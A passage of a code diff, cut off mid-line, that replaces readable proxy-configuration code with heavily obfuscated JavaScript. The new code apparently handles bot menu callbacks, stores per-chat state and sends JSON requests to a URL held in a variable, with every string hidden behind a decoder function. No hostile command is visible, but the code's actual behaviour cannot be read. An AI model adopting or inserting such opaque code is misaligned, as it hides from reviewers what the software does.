+          await func_ej(var_adw, func_dec(1141) + func_eh(func_dec(862)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + (var_d[func_dec(29)] || func_dec(1123)) + func_dec(1275) + func_eh(func_dec(900)) + func_dec(1276), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1242)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1242)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1143) + func_eh(func_dec(878)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + (var_d[func_dec(76)] || func_dec(1123)) + func_dec(1275) + func_eh(func_dec(900)) + func_dec(1276), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1252)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1252)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1277) + func_eh(func_dec(864)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + (var_d[func_dec(27)] || func_dec(1123)) + func_dec(1275) + func_eh(func_dec(900)) + func_dec(3), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1248)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1248)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1140) + func_eh(func_dec(880)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + (var_d[func_dec(35)] || func_dec(1123)) + func_dec(1275) + func_eh(func_dec(900)) + func_dec(1276), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1249)) {
+          let var_aku = (var_d[func_dec(72)] || [])[func_dec(144)]((var_akw, var_akx) => func_dec(3) + (var_akx + 1) + func_dec(1278) + var_akw[func_dec(206)] + func_dec(1071))[func_dec(143)](func_dec(468));
+          if (!var_aku) var_aku = func_dec(1123);
+          const var_akv = var_aam === func_dec(66) ? func_dec(1142) + func_eh(func_dec(882)) + func_dec(1273) + var_aku + func_dec(1279) : func_dec(1142) + func_eh(func_dec(882)) + func_dec(1273) + var_aku + func_dec(1280);
+          await func_ej(var_adw, var_akv, {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1267) + func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1250)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1250)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_aky = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(62),
+              [func_dec(480)]: func_dec(1281)
+            }], [{
+              [func_dec(200)]: func_dec(1282),
+              [func_dec(480)]: func_dec(1283)
+            }], [{
+              [func_dec(200)]: func_dec(1284),
+              [func_dec(480)]: func_dec(1285)
+            }], [{
+              [func_dec(200)]: func_dec(652),
+              [func_dec(480)]: func_dec(1286)
+            }], [{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          };
+          await func_ej(var_adw, func_dec(1145) + func_eh(func_dec(884)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + var_d[func_dec(61)] + func_dec(1287), var_aky, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1288))) {
+          const var_akz = var_ady[func_dec(155)](func_dec(1288), func_dec(3));
+          var_d[func_dec(61)] = var_akz;
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aaq[var_adw] = null;
+          var_aeb = func_eh(func_dec(902));
+          await func_ej(var_adw, func_dec(1172) + func_eh(func_dec(884)) + func_dec(1222) + var_akz + func_dec(1171), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1267) + func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1251)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1251)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1289) + func_eh(func_dec(886)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + var_d[func_dec(63)] + func_dec(1275) + func_eh(func_dec(900)) + func_dec(3), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1233)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1233)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1290) + func_eh(func_dec(859)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + var_d[func_dec(31)] + func_dec(1275) + func_eh(func_dec(900)) + func_dec(3), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1232)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1232)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1138) + func_eh(func_dec(853)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + var_d[func_dec(42)] + func_dec(1275) + func_eh(func_dec(900)) + func_dec(1291), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1254)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1292)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1293) + func_eh(func_dec(892)) + func_dec(1294) + func_eh(func_dec(898)) + func_dec(1224) + (var_d[func_dec(51)] ? func_dec(1296) + var_d[func_dec(51)][func_dec(145)](-4) : func_dec(1123)) + func_dec(1275) + func_eh(func_dec(900)) + func_dec(1295), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1256)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1297)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1298) + func_eh(func_dec(890)) + func_dec(1299) + (var_d[func_dec(54)] || func_dec(1123)) + func_dec(1275) + func_eh(func_dec(900)) + func_dec(1295), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1098)
+            }]]
+          }, var_adx);
         }
-        tpl.outbounds = newOutbounds;
-        return tpl;
-    }
-    // Fallback if template fails
-    return {
-        log: { disabled: false, level: "warn", timestamp: true },
-        dns: { servers: [], rules: [] },
-        inbounds: [],
-        [k_obds]: outboundsArr,
-        route: { rules: [] }
-    };
-}
+        var_aaj?.[func_dec(186)](func_e(func_dec(3) + var_aal + func_dec(1161), {
+          [func_dec(123)]: func_dec(197),
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          },
+          [func_dec(125)]: JSON[func_dec(119)]({
+            [func_dec(1162)]: var_adv[func_dec(172)],
+            [func_dec(200)]: var_aeb || func_dec(1300)
+          })
+        })[func_dec(187)](() => {}));
+      }
+    } else if (var_aak[func_dec(410)] && var_aak[func_dec(410)][func_dec(200)]) {
+      const var_ala = var_aak[func_dec(410)][func_dec(1069)][func_dec(172)];
+      const var_alb = var_aak[func_dec(410)][func_dec(200)][func_dec(255)]();
+      if (var_aap) {
+        const var_alc = func_ei();
+        const var_ald = var_alc && !var_alc[func_dec(646)];
+        const func_eo = async () => {
+          if (var_ald) {
+            const var_alg = await func_az(var_alc);
+            return var_alg[func_dec(108)] ? var_alg[func_dec(67)] || [] : null;
+          }
+          return var_d[func_dec(67)] || [];
+        };
+        if (var_alb === func_dec(1301)) {
+          var_aaq[var_ala] = null;
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_alh = func_ek(var_alc, var_aap);
+          await func_ej(var_ala, var_alh[func_dec(200)], var_alh[func_dec(1103)]);
+          return new Response(func_dec(509), {
+            [func_dec(231)]: 200
+          });
+        }
+        const var_ale = var_aaq[var_ala];
+        if (var_ale) {
+          if (!var_aap) {
+            var_aaq[var_ala] = null;
+            var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+            await func_ej(var_ala, func_eh(func_dec(752)));
+            return new Response(func_dec(509), {
+              [func_dec(231)]: 200
+            });
+          }
+          if (var_ale[func_dec(1175)] === func_dec(1176)) {
+            const var_ali = var_alb;
+            var_aaq[var_ala] = {
+              [func_dec(1175)]: func_dec(1302),
+              [func_dec(24)]: var_ali
+            };
+            var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+            const var_alj = func_dec(1219) + var_ali + func_dec(1273) + func_eh(func_dec(744)) + func_dec(3);
+            const var_alk = {
+              [func_dec(504)]: [[{
+                [func_dec(200)]: func_dec(1179),
+                [func_dec(480)]: func_dec(1181)
+              }], [{
+                [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+                [func_dec(480)]: func_dec(1116)
+              }]]
+            };
+            await func_ej(var_ala, var_alj, var_alk);
+            return new Response(func_dec(509), {
+              [func_dec(231)]: 200
+            });
+          }
+          if (var_ale[func_dec(1175)] === func_dec(1302) || var_ale[func_dec(1175)] === func_dec(1181)) {
+            const var_all = var_ale[func_dec(24)];
+            let var_alm = null;
+            let var_aln = null;
+            let var_alo = null;
+            if (var_ale[func_dec(1175)] !== func_dec(1181) && var_alb !== func_dec(148) && var_alb !== func_dec(1303)) {
+              const var_alq = var_alb[func_dec(18)](new RegExp(func_dec(1304), func_d
